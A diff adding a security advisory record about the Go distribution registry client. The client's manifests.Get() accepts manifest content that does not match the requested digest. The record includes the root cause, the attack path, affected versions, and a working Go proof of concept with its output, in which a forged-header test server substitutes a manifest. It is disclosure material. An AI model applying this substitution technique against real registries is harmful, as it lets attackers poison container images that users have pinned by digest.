@@ -1,0 +1,84 @@
+{
+  "id": "GHSA-685w-q87j-wqw3",
+  "modified": "2026-10-15T20:30:06.448565448Z",
+  "published": "2026-10-15T20:22:02Z",
+  "aliases": [
+    "CVE-2026-85747"
+  ],
+  "summary": "Distribution: Client `manifests.Get()` does not verify returned content against requested digest",
+  "details": "### Summary\n\n`registry/client.(*manifests).Get(ctx, dgst, …)` fetches a manifest by digest but never hashes the returned body and compares it against the requested digest. A malicious or compromised registry, or any MITM on the registry connection, can serve arbitrary manifest bytes in response to a digest-pinned request and the client returns the substituted content transparently to the caller. Any application relying on digest pinning for supply-chain integrity — image policy controllers, mirrors, pull-through caches — is silently undermined. The bundled pull-through proxy (`registry/proxy/proxymanifeststore.go`) is itself an unguarded consumer and is directly exploitable.\n\n### Details\n\n**Root cause:** `registry/client/repository.go:488-505` reads the response body and passes it directly to `distribution.UnmarshalManifest` without ever computing `digest.FromBytes(body)` and comparing against the caller-supplied `dgst`. The `Docker-Content-Digest` response header is parsed (lines 251-292 in `descriptorFromResponse`) only to populate an out-parameter (`ReturnContentDigest`) and is itself server-supplied — it is never recomputed from the body, so a lying server can set it to whatever value the caller requested while delivering different bytes.\n\n**Attack path:** An attacker who controls the registry endpoint (malicious registry, compromised upstream, DNS hijack, or TLS MITM) responds to `GET /v2/{name}/manifests/{digest}` with:\n1. `Docker-Content-Digest: \u003crequested-digest\u003e` (forged header)\n2. A body containing a different, attacker-chosen manifest\n\nThe client calls `distribution.UnmarshalManifest` on the substituted body, returns the attacker's manifest as if it were the pinned content, and the caller has no way to detect the substitution.\n\n**Why it matters:** The entire value of digest pinning is to guarantee content-addressable integrity against exactly this threat model (hostile or MITM server). The `registry/proxy/proxymanifeststore.go:42-87` pull-through cache calls `remoteManifests.Get(ctx, dgst)` and immediately writes the result to local storage with no re-verification — so a poisoned remote can permanently inject a bad manifest into the mirror cache, affecting all subsequent consumers.\n\nRelevant code path (`repository.go`, simplified):\n```go\n// line ~496\nfunc (ms *manifests) Get(ctx context.Context, dgst digest.Digest, options ...distribution.ManifestServiceOption) (distribution.Manifest, error) {\n    ...\n    resp, err := ms.client.Get(u)\n    ...\n    body, err := ioutil.ReadAll(resp.Body)  // no size limit, no digest check\n    ...\n    m, _, err := distribution.UnmarshalManifest(ct, body)  // returns attacker bytes\n    return m, err\n}\n```\n\n### PoC\n\n**go.mod:**\n```\nmodule poc\n\ngo 1.24.10\n\nrequire (\n        github.com/distribution/reference v0.6.0\n        github.com/docker/distribution v2.8.3+incompatible\n        github.com/opencontainers/go-digest v1.0.0\n)\n\nrequire (\n        github.com/beorn7/perks v1.0.1 // indirect\n        github.com/docker/go-metrics v0.0.1 // indirect\n        github.com/docker/libtrust v0.0.0-20160708172513-aabc10ec26b7 // indirect\n        github.com/golang/protobuf v1.3.2 // indirect\n        github.com/gorilla/mux v1.8.1 // indirect\n        github.com/matttproud/golang_protobuf_extensions v1.0.1 // indirect\n        github.com/opencontainers/image-spec v1.1.1 // indirect\n        github.com/prometheus/client_golang v1.1.0 // indirect\n        github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90 // indirect\n        github.com/prometheus/common v0.6.0 // indirect\n        github.com/prometheus/procfs v0.0.3 // indirect\n        github.com/sirupsen/logrus v1.9.4 // indirect\n        golang.org/x/sys v0.13.0 // indirect\n)\n```\n\n**main.go:**\n```go\n// PoC: registry/client manifests.Get() does not verify the requested digest\n// against the returned body. A malicious registry (or MITM) can serve\n// arbitrary content for a digest-pinned manifest reference and the client\n// will accept it.\npackage main\n\nimport (\n        \"context\"\n        \"fmt\"\n        \"net/http\"\n        \"net/http/httptest\"\n\n        \"github.com/distribution/reference\"\n        \"github.com/docker/distribution/manifest/schema2\"\n        \"github.com/docker/distribution/registry/client\"\n        \"github.com/opencontainers/go-digest\"\n)\n\n// A real, \"trusted\" manifest the user pinned by digest.\nvar trustedManifest = []byte(`{\n   \"schemaVersion\": 2,\n   \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\",\n   \"config\": {\"mediaType\": \"application/vnd.docker.container.image.v1+json\",\"size\": 1,\"digest\": \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"},\n   \"layers\": []\n}`)\n\n// A different, attacker-controlled manifest the malicious server returns instead.\nvar evilManifest = []byte(`{\n   \"schemaVersion\": 2,\n   \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\",\n   \"config\": {\"mediaType\": \"application/vnd.docker.container.image.v1+json\",\"size\": 1,\"digest\": \"sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\"},\n   \"layers\": []\n}`)\n\nfunc main() {\n        pinnedDigest := digest.FromBytes(trustedManifest)\n        evilDigest := digest.FromBytes(evilManifest)\n        fmt.Println(\"client requests manifest pinned at:\", pinnedDigest)\n        fmt.Println(\"server will instead return content :\", evilDigest)\n\n        srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n                // Lie: claim the digest matches what was asked, but serve evil bytes.\n                w.Header().Set(\"Content-Type\", schema2.MediaTypeManifest)\n                w.Header().Set(\"Docker-Content-Digest\", pinnedDigest.String())\n                w.WriteHeader(200)\n                w.Write(evilManifest)\n        }))\n        defer srv.Close()\n\n        name, _ := reference.WithName(\"library/alpine\")\n        repo, err := client.NewRepository(name, srv.URL, http.DefaultTransport)\n        if err != nil {\n                panic(err)\n        }\n        ms, _ := repo.Manifests(context.Background())\n\n        // Fetch by *digest* — caller expects content-addressed integrity.\n        m, err := ms.Get(context.Background(), pinnedDigest)\n        if err != nil {\n                fmt.Println(\"Get error:\", err)\n                return\n        }\n        _, payload, _ := m.Payload()\n        got := digest.FromBytes(payload)\n\n        if got != pinnedDigest {\n                fmt.Println()\n                fmt.Println(\"\u003e\u003e\u003e BYPASS: client accepted manifest that does NOT match requested digest\")\n                fmt.Println(\"    requested:\", pinnedDigest)\n                fmt.Println(\"    received :\", got)\n        } else {\n                fmt.Println(\"OK: digest verified\")\n        }\n}\n```\n\n**Output (v2.8.3+incompatible):**\n```\nclient requests manifest pinned at: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de\nserver will instead return content : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e\n\n\u003e\u003e\u003e BYPASS: client accepted manifest that does NOT match requested digest\n    requested: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de\n    received : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e\n```\n\n### Impact\n\nAny application that calls `registry/client.(*manifests).Get()` with a digest argument — and relies on that digest to guarantee which image content it receives — is affected. This includes image policy controllers that enforce allowed digests, pull-through cache/mirror implementations (including the bundled `registry/proxy`), and any CI/CD tooling that pins images by digest for reproducibility or security.\n\nAn attacker who controls or can MITM the registry endpoint can substitute arbitrary manifest content — changing image layers, entrypoints, or referenced blobs — and the client will accept and act on the substituted content without warning. The bundled pull-through proxy will cache and re-serve the poisoned manifest to all downstream clients.\n\nExploitation requires either control of the registry endpoint the victim is configured to use, or a MITM/TLS-breaking position on that connection. No authentication is needed beyond whatever the registry normally requires.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/docker/distribution",
+        "purl": "pkg:golang/github.com/docker/distribution"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.8.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-685w-q87j-wqw3/GHSA-685w-q87j-wqw3.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/distribution/distribution/v3",
+        "purl": "pkg:golang/github.com/distribution/distribution/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-685w-q87j-wqw3/GHSA-685w-q87j-wqw3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/distribution/distribution/security/advisories/GHSA-685w-q87j-wqw3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85747"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/distribution/distribution/commit/8f91c26c8888a95a36c2357a6e30bc15d4dd76d3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/distribution/distribution/commit/960439b09f342cdeb8f1c0e18e8c7349bdcfbf80"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/distribution/distribution"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/distribution/distribution/releases/tag/v3.1.2"
+    }
+  ]
+}
